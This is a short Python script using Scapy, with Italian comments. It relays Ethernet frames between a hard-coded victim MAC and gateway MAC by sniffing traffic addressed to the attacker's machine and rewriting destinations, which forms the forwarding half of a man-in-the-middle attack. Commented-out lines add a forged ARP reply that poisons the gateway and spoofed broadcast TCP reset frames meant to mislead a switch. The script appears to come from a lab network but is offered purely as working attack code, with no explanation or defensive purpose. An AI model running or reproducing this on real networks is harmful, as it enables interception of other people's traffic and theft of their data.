from scapy.all import *
from scapy.layers.inet import Ether, IP, TCP

gateway_mac='52:54:00:88:15:b6'
victim_mac='08:00:27:ff:8f:3c'
my_mac='08:00:27:24:32:1f'
broadcast_mac='ff:ff:ff:ff:ff:ff'

def change_send(pckt):
	if pckt[Ether].src==gateway_mac:
		pckt[Ether].dst = victim_mac
		sendp(pckt)
		print("Replico alla vittima" )
	elif pckt[Ether].src==victim_mac:
		pckt[Ether].dst = gateway_mac
		sendp(pckt)
		#sendp(Ether(dst=broadcast_mac,src=victim_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]))
	
		#sendp(Ether(dst=gateway_mac,src=my_mac)/ARP(op=2,psrc="192.168.20.122",pdst="192.168.20.1", hwdst=gateway_mac))
		print("Replico al gateway")
		#print("Spooffo lo switch inviando un paccketto fittizio con il mac della vittima")
		#sendp(Ether(dst=broadcast_mac,src=victim_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]))
	
		


while 1:
    sniff(lfilter=lambda d: d.dst==my_mac, prn=change_send)
	
